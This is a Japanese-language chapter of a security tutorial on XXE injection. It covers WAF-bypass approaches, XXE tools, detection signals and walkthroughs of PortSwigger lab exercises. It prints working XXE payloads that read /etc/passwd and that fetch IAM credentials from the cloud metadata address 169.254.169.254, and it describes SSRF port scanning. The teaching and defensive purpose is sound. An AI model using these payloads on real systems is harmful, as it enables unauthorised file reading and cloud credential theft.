> 出典: PayloadsAllTheThings「XXE Injection」— https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

これら「XML内包型ファイル形式」へのXXE注入と、アップロード機能そのものの悪用（ファイル種別偽装、パストラバーサルなど）を組み合わせた攻撃パターンは、次章「XXE×ファイルアップロードの複合攻撃」で詳しく扱う。

### 9. 検知回避（WAFバイパス）の考え方

WAF（Web Application Firewall）は多くの場合、`<!DOCTYPE`や`SYSTEM`、`file://`といった既知の危険な文字列パターンをシグネチャとして検知する。以下は原理として知っておくべき回避の方向性である（防御側として、これらを踏まえたシグネチャ設計の限界を理解する目的で紹介する）。

- **文字エンコーディングの変換**: ペイロードをUTF-16BEなど別のエンコーディングに変換して送信する。多くのシグネチャベースのWAFはUTF-8を前提に文字列マッチングを行うため、バイト列レベルでは一致しなくなる一方、パーサ側は`encoding`宣言やBOM（Byte Order Mark）を見て正しくデコードしてしまう。
  ```bash
  cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
  ```
- **Content-Typeの偽装**: アプリケーションが`Content-Type: application/json`のエンドポイントでも、内部的にXMLパーサへフォールバックする実装（例えばSOAP互換レイヤーやレガシーAPI）が残っている場合、リクエストヘッダとボディをXML形式に書き換えて送ることで、JSON前提のWAFルールを迂回できることがある。
- **パラメータ実体による間接化**: 危険な文字列（`SYSTEM`など）そのものを直接書かず、動的に組み立てたパラメータ実体経由で生成することで、静的な文字列マッチングを回避する。

これらはいずれも「WAFのシグネチャ検知だけに依存した対策は原理的に迂回され得る」ことを示している。確実な防御は、XMLパーサ側で外部実体解決・DTD処理そのものを無効化することであり、これは次節（第2章末または防御章）で扱う。

> 出典: Hackviser「XXE Attack Guide」— https://hackviser.com/tactics/pentesting/web/xxe

### 10. 検知・自動化ツール一覧

実務での検証（防御側の自己診断・ペネトレーションテストにおいても、許可された範囲でのみ使用すること）に使われる代表的なツールを整理する。

| ツール | 用途 |
|---|---|
| Burp Suite Collaborator | OOB通信（DNS/HTTP）を観測してBlind XXEを検知する |
| XXEinjector (enjoiz) | OOB DTDサーバの立ち上げからファイル抽出までを自動化 |
| xxeserv (staaldraad) | FTP対応の簡易サーバでOOBペイロード配信をテスト |
| oxml_xxe (BuffaloWill) | DOCX/XLSX/PPTX/ODT/SVGなどのファイルにXXEペイロードを自動埋め込み |
| docem (whitel1st) | オフィス文書へのXXE/XSSペイロード埋め込み |
| Nuclei | テンプレートベースでの既知XXEパターンの自動スキャン |

> 出典: PayloadsAllTheThings「XXE Injection」— https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection ／ Hackviser「XXE Attack Guide」— https://hackviser.com/tactics/pentesting/web/xxe

### 検知の着眼点（診断者・防御者向けまとめ）

これらのペイロードに共通する検知シグナルを整理すると、次の3点に集約できる。

1. **レスポンス内に実体展開結果がそのまま現れるか**（in-band、最も検知しやすい）。
2. **エラーメッセージの内容が変化するか**、特に「ファイルが見つからない」系のエラーに攻撃者が指定していない文字列（＝ファイル内容の断片）が混じっていないか。
3. **アウトバウンド通信（DNS/HTTPのアクセスログ）が発生しているか**（Blind XXEはこれでしか気付けない）。防御側の自己診断では、Burp Collaboratorのような外部コールバック観測基盤を使い、意図しないアウトバウンド通信の有無自体をテストするのが最も確実な検証手段である。

いずれの手法も、根本原因は「XMLパーサがDTD内の外部実体宣言をデフォルトで解決してしまう」という処理系の初期設定にある。パーサ自体の安全な設定方法（外部実体解決・DTD処理の無効化）については、本書の防御章で各言語・ライブラリごとの具体的な設定コードとともに扱う。

## 古典的XXEのwriteup

本節では、PortSwiggerのApprenticeレベルのXXEラボに関する2本のwriteupと、日本語で書かれたXXE→SSRF連鎖の実例解説を通じて、「古典的XXE」（外部実体宣言をそのまま使ってファイル読取やSSRFを行う、対策がされていない素朴な実装）がどのように発見・悪用されるのかを、手順レベルで追体験する。前章までで見たDTD（Document Type Definition。XML文書の構造や、独自の「実体（entity）」をどう定義するかを宣言する仕組み）とENTITY宣言の理論を、実際の攻撃対象・ペイロード・レスポンスに結びつけて理解することが目的である。

### 対象と前提

ここで扱う2件のwriteupは、いずれもPortSwigger Web Security Academyが提供する意図的脆弱アプリ（学習用に用意された、脆弱性を含むデモサイト）上のラボを対象にしている。実在の本番サービスではなく、学習者が個人のラボインスタンスに対してのみ操作する前提で構成されているため、本節の内容をそのまま実サービスに対して試すことは許可されておらず、行ってはならない。ここで学ぶのは、あくまで「XXEがどのように成立し、どう検出し、どう防ぐか」という仕組みの理解である。

> ⚠️ **未取得の資料**: 「Portswigger Web Security Academy | XXE Lab #1」（BooRuleDie, Medium）および「PortSwigger Web Security Academy Labs — XXE Injection, CSRF, SSRF, CORS Apprentice Level」（Dipikanta Dutta, Medium）は自動取得できませんでした（理由: Medium側が本文取得リクエストをHTTP 403で拒否したため。WebSearchで得られる要約・抜粋、および代替のGitHubミラーの有無を確認したが、同等内容の完全なミラーは見つからなかった）。以下のURLからご自身で直接ご覧ください:
> - https://medium.com/@booruledie/portswigger-web-security-academy-xxe-lab-1-820613089d3d
> - https://medium.com/@dipikanta.dutta/portswigger-web-security-academy-labs-xxe-injection-csrf-ssrf-cors-apprentice-level-9b5ec8b26295
>
> （以下は未取得資料の補足として一般知識に基づく解説です）両記事とも、対象はPortSwigger Web Security AcademyのApprenticeレベルXXEラボである「Exploiting XXE using external entities to retrieve files（外部実体を使ってファイルを読み取るXXEの悪用）」、および同academyの「Exploiting XXE to perform SSRF attacks（SSRFを行うためのXXE悪用）」に相当する内容であり、検索結果に現れた記事の抜粋・要約とも整合する。以降はこの一般知識と、後述のPortSwigger公式ラボの構成（これらのwriteupが解説対象としている公開されたラボの仕様そのもの）に基づいて、攻撃の流れとペイロードを具体的に解説する。

### ラボ1: 外部実体を使ったファイル読取（BooRuleDieのwriteupが対象とするラボ）

#### アプリケーションの挙動を観察する

このラボは「本の在庫確認（Check stock）」機能を持つ小規模なECサイトを模している。商品ページで在庫を確認するボタンを押すと、ブラウザは背後でXMLボディを持つPOSTリクエストをサーバーに送信する。Burp Suite（HTTPリクエストを傍受・改変できるプロキシツール）でこの通信を捕捉すると、次のようなリクエストが観測できる。

```http
POST /product/stock HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/xml
Content-Length: 107

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

ここで着目すべきは「Content-Type: application/xml」かつボディが素のXMLである点である。JSONやURLエンコードされたフォームデータではなく、サーバー側でXMLパーサが直接この入力を解釈している。これはXXEを疑う最初の兆候であり、XMLを受け取っている＝どこかにXMLパーサという「sink」（入力が最終的に解釈・実行される危険な代入先）が存在することを意味する。

#### DOCTYPE宣言を注入する

素朴な検証として、まずXML文書の先頭にDOCTYPE宣言を追加し、外部実体としてローカルファイルを読み込ませ、その実体をレスポンスに反映されるフィールド（ここでは`productId`）に埋め込む。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

なぜこれで`/etc/passwd`が読み出せるのか、仕組みを分解する。

1. `<!DOCTYPE foo [ ... ]>`は、XML文書がこれから使う独自のDTDをインライン（内部サブセットと呼ぶ）で宣言する。`foo`は文書のルート要素名と一致していればよく、任意の識別子でよい。
2. `<!ENTITY xxe SYSTEM "file:///etc/passwd">`は「外部一般実体」の宣言である。`SYSTEM`キーワードは「この実体の内容は外部のリソースから取得する」ことを示し、続くURIがそのリソースの場所を指す。`file://`スキームはローカルファイルシステム上のパスを指すURIスキームであり、多くのXMLパーサはデフォルトでこれを許可している。
3. XMLパーサがDTDを解決する際、`SYSTEM`識別子で指定されたリソースを実際に読み込み、その内容を実体`xxe`の値として展開（置換）する。この「外部エンティティの内容をパーサがそのまま文書に埋め込んでしまう」処理こそがXXEの核心であり、パーサはこの内容が信頼できるかどうかを一切検証しない。
4. 本文中の`&xxe;`という参照は、パーシング時にこの実体の値、すなわち`/etc/passwd`の全内容に置換される。
5. アプリケーションが`productId`の値（＝ファイルの内容）をそのままエラーメッセージやレスポンスに含めて返す実装になっていれば、攻撃者はレスポンスを見るだけでファイル内容を読み取れる。これを「in-band（帯域内）XXE」または「同期的XXE」と呼ぶ。

このラボの最終目標であるアプリケーションのレスポンスには、例えば次のような形で`/etc/passwd`の内容がそのまま反映される。

```
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

ここでのポイントは、`productId`という本来は数値やIDを期待するはずのフィールドが、実体参照の展開後には任意の文字列（ファイル内容）に置き換わってしまうという点である。アプリケーション側のバリデーションは「XMLとして正しいか」しか見ておらず、「展開後の値が期待する形式か」までは見ていないことが多く、これが攻撃を成立させる隙になっている。

> 出典: Portswigger Web Security Academy | XXE Lab #1 — https://medium.com/@booruledie/portswigger-web-security-academy-xxe-lab-1-820613089d3d （本文取得不可のため、内容はPortSwigger公式ラボ仕様と検索結果抜粋に基づく一般的解説）

### ラボ2: XXEを使ったSSRF、および関連するApprenticeラボ群（Dipikanta Duttaのwriteupが対象とする範囲）

#### 内部URLへのリクエストを強制する

同じ「在庫確認」型のXMLエンドポイントに対し、`SYSTEM`識別子に`file://`ではなくHTTP URLを指定すると、パーサはそのURLに対してHTTPリクエストを発行する。これがXXE経由のSSRF（Server-Side Request Forgery。サーバー自身に、攻撃者が指定した宛先へリクエストを発行させる攻撃）である。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

`169.254.169.254`は多くのクラウド環境（AWS EC2をはじめとする）でインスタンスメタデータサービスに割り当てられている、いわゆるリンクローカルアドレス（同一ネットワークセグメント内でのみ到達可能な特別なIPアドレス帯）である。通常はインターネットからも、多くの場合アプリケーション自身のコードからも直接到達を意図されていないが、サーバー自身が発行するリクエストとしてならアクセスできてしまう。XXEはXMLパーサに「サーバー自身の立場で」HTTPリクエストを発行させるため、通常のネットワーク境界（ファイアウォールや、外部公開されていないという前提）を迂回する。

このリクエストの結果、IAMロール名の一覧やロールに紐づく一時的な認証情報（アクセスキー、シークレットキー、セッショントークン）がレスポンスとして返るクラウド環境も存在する。これが漏洩すると、攻撃者はそのロールに割り当てられた権限の範囲でクラウドAPIを操作できてしまう。これはXXEという「XMLパーサの実装上の問題」が、クラウド基盤の認証情報漏洩という重大なインシデントにまで発展しうることを示す典型例である。

#### ポート・サービスの内部探索への応用

`SYSTEM`識別子のURLを変えることで、内部ネットワーク上の到達可能なホストやポートを走査することもできる。例えば`http://internal-host:8080/`のようなURLを次々に試し、レスポンスの違い（接続に成功しコンテンツが返る／接続拒否でエラーになる／タイムアウトする、など）を観察すれば、外部からは見えない内部サービスの存在を推測できる。これはXXEを使ったポートスキャンであり、SSRFの応用形の一つとして位置づけられる。同じ理屈は、CSRF・CORSといった他の「サーバーやブラウザに意図しないリクエストを発行させる」脆弱性クラスとも根が共通しており、writeupのタイトルがXXE・SSRF・CSRF・CORSをまとめて扱っているのはこのためである。ただし攻撃手法としての細部（CSRFはブラウザの自動送信するクッキーを悪用し、CORSは同一生成元ポリシーの緩和設定を悪用する点）はXXEとは別の章で扱う。

#### なぜレスポンスが返らない場合でも危険なのか

このラボ群では、アプリケーションがXML処理結果を直接レスポンスに含めない「blind（見えない）」なケースも扱われる。この場合でも、外部実体の`SYSTEM` URLへのリクエスト自体はサーバー側で発生するため、攻撃者が制御するサーバーをリスナーとして立てておけば、そこへのアクセスログの有無だけで「脆弱性が存在するかどうか」を判定できる（out-of-band、帯域外での検知）。さらに悪意のある外部DTDを組み合わせれば、ファイル内容をパラメータ化実体（後述の第3節で詳しく扱う、DTD内部で使う特殊な実体）としてこの外部サーバーへのリクエストURLに埋め込み、間接的に情報を持ち出すことも可能になる。この技法自体の詳細な仕組みは次節（Out-of-Band XXEとblind XXE）で扱うため、ここでは「レスポンスに反映されなくても、外部へのリクエスト発生という副作用だけで脆弱性の存在と、場合によってはデータ持ち出しまで成立する」という結論だけを押さえておく。

> 出典: PortSwigger Web Security Academy Labs — XXE Injection, CSRF, SSRF, CORS Apprentice Level — https://medium.com/@dipikanta.dutta/portswigger-web-security-academy-labs-xxe-injection-csrf-ssrf-cors-apprentice-level-9b5ec8b26295 （本文取得不可のため、内容はPortSwigger公式ラボ仕様と検索結果抜粋に基づく一般的解説）

### 日本語事例: XXE経由でクラウドメタデータ・IAM認証情報を取得する実例（徳丸浩の日記、2018年12月）

徳丸浩氏のブログ2018年12月の記事群では、SSRFとXXEを組み合わせて、クラウド環境のインスタンスメタデータサービスからIAM一時認証情報を取得する事例が解説されている。要点を整理する。

#### SSRFとXXEが「同じ着地点」に至る構造

記事では、URLプレビュー機能のような、アプリケーションがサーバー側で外部URLへリクエストを発行する機能一般がSSRFの入り口になりうると指摘されている。典型例として、PHPの`curl`関数などHTTPリクエスト送信機能の入力検証が不十分な場合、攻撃者が指定した任意のURL（`http://169.254.169.254/latest/meta-data/iam/security-credentials/`など）へサーバーがリクエストを発行してしまう。

これはXXEにも同じ形で当てはまる。DOMDocumentのようなXMLパーサライブラリ（記事では`DOMDocument::load()`とlibxml2のバージョンに言及）が外部実体の解決処理でURLへのHTTPリクエストを内部的に発行するため、XXEの`SYSTEM`識別子にメタデータサービスのURLを与えれば、SSRFと全く同じ着地点（クラウドの認証情報窃取）に到達する。つまりXXEは、「XMLパーサ経由で実現されるSSRFの一種」として理解することもできる、という構造上の関係が示されている。

#### なぜlibxml2のバージョンが問題になるのか

記事はDOMDocument::load()が内部で使うlibxml2（多くの言語処理系がXMLパースに利用するCライブラリ）の脆弱なバージョンにおいて、外部実体の展開処理に問題があったことに触れている。バージョンや修正状況は経年で変化するため、libxml2は2.9.0以降、デフォルトで外部実体の自動展開（`LIBXML_NOENT`のような明示指定がない限り）を無効化する方向に修正されてきた歴史がある。ただし言語バインディング側（PHPのDOMDocument、各種SDKなど）が独自にオプションを設定して外部実体展開を有効化してしまっているケースが後を絶たず、「ライブラリ自体は安全な既定値を持っていても、呼び出し側のオプション指定次第で再び脆弱になる」という点が実務上重要な教訓である。したがって「libxml2の何年のバージョンだから安全」と一律には言えず、実際にアプリケーションが使っているパーサの初期化オプションまで確認する必要がある。

#### 対策として挙げられている内容

記事で言及されている対策は、SSRF・XXEそれぞれの観点から次のように整理できる。

- SSRF対策: URLの許可スキーム（HTTP/HTTPSのみなど）を検証すること、ホスト名からIPアドレスへの名前解決の結果を検証し内部アドレス帯（`169.254.0.0/16`、`127.0.0.0/8`、RFC1918のプライベートアドレス帯など）へのアクセスを拒否すること、ファイアウォールやiptablesのようなネットワークレベルの制御でメタデータサービスへのアクセス経路自体を遮断すること、到達先URLのホワイトリスト管理を行うこと。
- XXE対策: 脆弱なバージョンのXMLパーサライブラリに対するセキュリティパッチの適用、そして外部実体処理そのものをアプリケーション側の設定で無効化すること。

これらの対策のうち、特に重要なのは「XMLパーサ側で外部実体展開を無効化する」という対策が、SSRF側のネットワーク制御より優先度が高いという点である。ネットワーク制御（ファイアウォールでのメタデータサービス遮断など）は多層防御の一環として有効だが、それだけに頼ると、他の内部リソース（社内ファイルサーバー、管理系API等）へのSSRFまでは防げない。パーサレベルで外部実体解決そのものを止めることが、XXE起因のSSRFに対する根本的な対策になる。この具体的な設定方法（言語・パーサ別の無効化コード例）は第4章「防御と診断」で詳細に扱う。

> 出典: 徳丸浩の日記 2018年12月 — https://blog.tokumaru.org/2018/12/

### 3件のwriteupを通じて見える共通パターン

3件の資料をまとめると、「古典的XXE」に共通する実務上のパターンが浮かび上がる。

1. **入り口の見分け方は共通**: `Content-Type: application/xml`または類似のXML系MIMEタイプでボディが送信されている箇所は、SOAP API、ファイルアップロード（DOCX/XLSX/SVGなどXMLベースのフォーマット）、Webhookの受信エンドポイントなど多岐にわたるが、いずれも「XMLパーサがどこかで入力を処理している」という共通点を持つ。
2. **同じDOCTYPE注入パターンが繰り返し使われる**: `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "...">]>`という形は、対象が`file://`であろうと`http://`であろうと本質的に同じ構造であり、違いは`SYSTEM`識別子に何を指定するかだけである。この対称性を理解しておくと、ファイル読取用ペイロードとSSRF用ペイロードを別物として覚える必要がなくなる。
3. **可視・不可視の違いはあっても脆弱性の根は同じ**: レスポンスに実体展開結果が直接表示される（in-band）か、外部へのリクエスト発生という副作用でしか観測できない（out-of-band/blind）かは、アプリケーションの実装（エラーメッセージの詳細度など）に依存する見え方の違いに過ぎず、パーサが外部実体を解決してしまうという根本原因は共通している。
4. **クラウド環境ではSSRFとXXEの被害が収斂する**: メタデータサービスという単一の攻撃対象に、SSRFとXXEという別々の入口からたどり着けてしまう。これは脅威モデリングの観点で、「SSRFを塞いだからXXEも安全」あるいはその逆、という誤った安心につながりやすい落とし穴でもある。両方の対策を独立に講じる必要がある。


---

[← 第1章 前提 — XMLとDTDの基礎](01-xml-dtd-basics.md) ｜ [目次](index.md) ｜ [第3章 盲目XXE（Blind XXE / OOB XXE） →](03-blind-xxe.md)
